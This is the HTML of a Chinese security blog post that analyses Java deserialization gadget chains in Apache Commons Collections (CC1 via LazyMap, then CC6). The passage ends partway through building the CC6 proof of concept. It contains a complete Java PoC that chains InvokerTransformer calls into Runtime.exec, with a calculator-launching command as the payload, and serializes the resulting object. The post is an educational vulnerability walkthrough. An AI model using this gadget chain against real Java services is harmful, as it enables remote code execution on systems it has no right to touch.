@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Java安全之cc6链前言荒废了一段时间了，是时侯捡起cc链了，我们前面讲了CC1链和URLDNS链。但是CC1链中的AnnotationInvocationHandler会在jdk 8u71版本之后做了更改，所以高版本的时候CC1链就不适用了，此时我们只能寻找其它的调用链，也就是我们这一次要说的CC6. 声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之cc6链">
+<meta property="og:url" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Java安全之cc6链前言荒废了一段时间了，是时侯捡起cc链了，我们前面讲了CC1链和URLDNS链。但是CC1链中的AnnotationInvocationHandler会在jdk 8u71版本之后做了更改，所以高版本的时候CC1链就不适用了，此时我们只能寻找其它的调用链，也就是我们这一次要说的CC6. 声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/k4Gr4z2GYTJjh-R2YTC1fOXVpxZEAGuZP4qphaLFid4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/dwewXVHR3rZTvRtxb8R5cgfxT2FJL8LfQLtBCiUisgw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/WcXs-NV9BgxEL_T_xJGdWlLlYFv8h9AlYBg4WKRgF8k.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/zleySJ5xrQoR1JH5VMSB6CtFjnNWWJnHE7fF1Wxysos.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/LBuWa0NW9L-cq5sg8j7x7q9WkQuJKMlGVE94FdNY_Og.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/MCJEJA-N_cyezSKY69omsTUR7O8kGfyCcx5rZBV3PxE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/-YOvvzgUVlIeyIxpT2FOm9WuQnvFYAEMomy0FVkzWuo.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/6wmw4nWUA9egT3LOfKen1p7ZAEFu3TR8f3VaDZ4rPOQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/4VpLUQjetovfUGYFoqZSfH3OVJ3GFZgRqTNFhzITWMc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/S1K0bKO3xHHbfgrKzC57uc8iSbwy_q8rbkRnU065Lw4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/KdbDJywZpc8A5t5Tfq2M-3zTT_3aI1YTQTZZwRcK4Nw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/7-FptKLxXa4IG9jEqpLWqs8idma6B17Uq3jNezBHPM8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/YfmNOLxo3a2upQehCnb8hOchFkEKALwn8M1DnADZTW0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/-w7L1RMP8Y0s9ZHZBcdPQREIEu9IfKMs5Mi2azVsY2Q.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/_WHQOveCBnsrUb21oxHfRYGEculKq1KINmdbTZqkoxs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/RaC2RUbTqHIRx3C93PzaO1ajXLmG2i-m7SxXSSAYmJA.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/Ryhb3ypacdm_6dKf7RMigHeZpMBimfeR1Vp-SM1-2t4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/gHWHqBWjaYhVwliZ0EdV79aBR-oCDvRd3GOpbJwOYrQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/UEdzKBjDnnQnsWPzS4xLqu3xmrigif5GFoiV6Qu_pD8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/YwpIQGRQ2SMpl3PxizuAak4rMD2IxFHroBx70Af-6AQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/251Yg7En3NZ5U1nmf99Mj1IyXiG5QA0zoSE2cR8dnBk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/tGhMaRFX5eChkitCRb0Ym8W-IZdMqm1Uzdmak69YcCw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/yBfAIumMqn3dOY4h61bDGPSJTVme14HPbVQTtcHrkU8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/ChqoiGgI-tpoewpSFiHYgtmV_H9vhJvQTLi1YHnI6yw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/JIBdTEcBguto3gH8-99V-35YAGa7x4tLUE_vQJUE0FM.png">
+<meta property="article:published_time" content="2023-08-07T11:38:38.000Z">
+<meta property="article:modified_time" content="2023-08-07T10:52:14.483Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/k4Gr4z2GYTJjh-R2YTC1fOXVpxZEAGuZP4qphaLFid4.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java安全之cc6链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&text=Java安全之cc6链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&is_video=false&description=Java安全之cc6链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全之cc6链&body=Check out this article: https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&title=Java安全之cc6链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&name=Java安全之cc6链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/&t=Java安全之cc6链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">Java安全之cc6链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E7%9A%84cc1"><span class="toc-number">1.2.</span> <span class="toc-text">新的cc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B0%E7%9A%84cc1"><span class="toc-number">1.3.</span> <span class="toc-text">实现新的cc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cc1%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">cc1修复分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">CC6分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0cc6-poc"><span class="toc-number">1.6.</span> <span class="toc-text">构造cc6 poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全之cc6链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-07T11:38:38.000Z" class="dt-published" itemprop="datePublished">2023-08-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Java安全之cc6链"><a href="#Java安全之cc6链" class="headerlink" title="Java安全之cc6链"></a>Java安全之cc6链</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>荒废了一段时间了，是时侯捡起cc链了，我们前面讲了CC1链和URLDNS链。但是CC1链中的AnnotationInvocationHandler会在jdk 8u71版本之后做了更改，所以高版本的时候CC1链就不适用了，此时我们只能寻找其它的调用链，也就是我们这一次要说的CC6.</p>
+<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>
+<h2 id="新的cc1"><a href="#新的cc1" class="headerlink" title="新的cc1"></a>新的cc1</h2><p>我们都知道在CC1链中AnnotationInvocationHandler的readObject方法里面调用到setValue，所以我们需要寻找另外一个能调用到setValue的地方。</p>
+<p>我们在分析CC1的时候是用TransformedMap去调用的transform。现在我们换成LazyMap这个类以另一种形式去实现CC1。</p>
+<p><img src="k4Gr4z2GYTJjh-R2YTC1fOXVpxZEAGuZP4qphaLFid4.png" alt="image"></p>
+<p>在LazyMap类中有一个get方法，其大致的意思是接收一个键（key），并返回与该键关联的值（value）。如果键不存在于映射（map）中，则通过工厂方法（factory.transform(key)）创建相应的值，并将键值对添加到映射中。这里调用了factory.transform。我们再去看哪里调用了LazyMap的get方法。</p>
+<p><img src="dwewXVHR3rZTvRtxb8R5cgfxT2FJL8LfQLtBCiUisgw.png" alt="image"></p>
+<p>那么下一步就去找哪里调用了这个get，太难找了，我们直接就去分析前人总结的AnnotationInvocationHandler类吧。我们发现在sun.reflect.annotation的AnnotationInvocationHandler类中调用了get方法，且是我们可控的</p>
+<p><img src="WcXs-NV9BgxEL_T_xJGdWlLlYFv8h9AlYBg4WKRgF8k.png" alt="image"></p>
+<p>我们往上看，发现是在invoke方法里面的。这个方法是只要外面有动态代理调用方法，就会调用这个invoke方法。</p>
+<p><img src="zleySJ5xrQoR1JH5VMSB6CtFjnNWWJnHE7fF1Wxysos.png" alt="image"></p>
+<p>从代码分析上面看，最好不要满足第一个if，如果是调用了equals，就会直接进行return了。第二个if是如果参数不为零（如果调用的是有参方法），就会进行抛出异常。那么我们就需要在readObject中找到一个是调用无参方法的，正好在该类中就有一个。</p>
+<p><img src="LBuWa0NW9L-cq5sg8j7x7q9WkQuJKMlGVE94FdNY_Og.png" alt="image"></p>
+<p>此时的调用链大致为</p>
+<p><img src="MCJEJA-N_cyezSKY69omsTUR7O8kGfyCcx5rZBV3PxE.png" alt="image"></p>
+<h2 id="实现新的cc1"><a href="#实现新的cc1" class="headerlink" title="实现新的cc1"></a>实现新的cc1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.ccChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/8/6 9:39 上午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1New</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    Map&lt;Object,Object&gt; lazydMap= LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class c=  Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazydMap);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line">    Object obj= constructor.newInstance(Override.class,mapProxy);</span><br><span class="line">    serialize(obj);</span><br><span class="line">    unserialize();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>( <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>( <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="-YOvvzgUVlIeyIxpT2FOm9WuQnvFYAEMomy0FVkzWuo.png" alt="image"></p>
+<h2 id="cc1修复分析"><a href="#cc1修复分析" class="headerlink" title="cc1修复分析"></a>cc1修复分析</h2><p>我们看一下在新的版本中是被怎么修复的</p>
+<p>原因：我们发现memberValues的获取方式做了修改</p>
+<p><img src="6wmw4nWUA9egT3LOfKen1p7ZAEFu3TR8f3VaDZ4rPOQ.png" alt="image"></p>
+<p>根本原因：setvalue被移除了</p>
+<p><img src="4VpLUQjetovfUGYFoqZSfH3OVJ3GFZgRqTNFhzITWMc.png" alt="image"></p>
+<h2 id="CC6分析"><a href="#CC6分析" class="headerlink" title="CC6分析"></a>CC6分析</h2><p>我们分析了cc1的修复，发现从AnnotationInvocationHandler类中去实现cc1已经不可能了，两种实现的方式都被修复了。但是TransformedMap类和LazyMap类后面的链还是可以继续使用的。下面我们继续用LazyMap类后半部分来构造新的链，也就是我们下面要说的cc6。</p>
+<p>我们在TiedMapEntry类中发现了getValue方法里面有调用到LazyMap类的get</p>
+<p><img src="S1K0bKO3xHHbfgrKzC57uc8iSbwy_q8rbkRnU065Lw4.png" alt="image"></p>
+<p>在本类中的hashCode又调用了getValue</p>
+<p><img src="KdbDJywZpc8A5t5Tfq2M-3zTT_3aI1YTQTZZwRcK4Nw.png" alt="image"></p>
+<p>我们都知道在hashmap的里面有调用了hashCode的</p>
+<p><img src="7-FptKLxXa4IG9jEqpLWqs8idma6B17Uq3jNezBHPM8.png" alt="image"></p>
+<p>我们继续跟进去看看哪里调用hashCode；于是就很熟悉了，想起了URLDNS的那条链，在HashMap这个类中的readObject方法中调用了hash，然后hash里面又调用了hashCode</p>
+<p><img src="YfmNOLxo3a2upQehCnb8hOchFkEKALwn8M1DnADZTW0.png" alt="image"></p>
+<p>readObject方法中调用了hash</p>
+<p><img src="-w7L1RMP8Y0s9ZHZBcdPQREIEu9IfKMs5Mi2azVsY2Q.png" alt="image"></p>
+<h2 id="构造cc6-poc"><a href="#构造cc6-poc" class="headerlink" title="构造cc6 poc"></a>构造cc6 poc</h2><p>于是我们就可以结合URLDNS那条链来进行构造cc6；前面的执行命令和使用LazyMap都是和上述讲的cc1是一样的，我们从TiedMapEntry开始。</p>
+<p>实例化一个TiedMapEntry，我们看一下构造函数，需要传入一个mao和一个key</p>
+<p><img src="_WHQOveCBnsrUb21oxHfRYGEculKq1KINmdbTZqkoxs.png" alt="image"></p>
+<p>我们就写成这样，传入一个map,然后key就随便写了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;qwe&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>然后再实例化一个hashmap把当作key放进去，因为hashmap的readObject方法是对key进行hash的，然后value随意</p>
